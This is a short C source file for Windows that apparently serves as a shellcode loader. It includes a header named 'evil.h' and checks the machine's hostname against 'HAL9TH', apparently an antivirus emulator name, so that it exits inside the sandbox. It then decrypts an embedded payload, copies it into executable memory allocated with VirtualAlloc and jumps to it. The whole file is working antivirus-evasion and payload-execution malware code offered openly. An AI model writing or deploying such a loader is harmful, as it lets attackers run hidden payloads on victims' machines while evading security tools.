#include "windows.h"
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include "evil.h"

#ifdef _WIN32
#include <intrin.h>
#else
#include <x86intrin.h>
#endif

char *getComputerName(){
    static TCHAR buffer[256] = TEXT("");
    DWORD dwSize = _countof(buffer);
    GetComputerNameExA(ComputerNameDnsHostname,buffer, &dwSize);
    return (char *)buffer;
}

int crashEngine(){    
    //HAL9TH
    if(!strcmp(getComputerName(),"HAL9TH")){
        return 1;
    }
    return 0;
}

int main(){


    if(crashEngine()){
        return;
    }
   
    printf("unencrypting...\n");
    DecryptPayload();

    printf("VirtualAlloc\n");
	void *exec = VirtualAlloc(0, sizeof (shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    printf("exec %p\n",exec);
	memcpy(exec, shellcode, sizeof shellcode);

    printf("memcpy \n");
	((void(*)())exec)();
    
    printf("end \n");
    return 0;
}
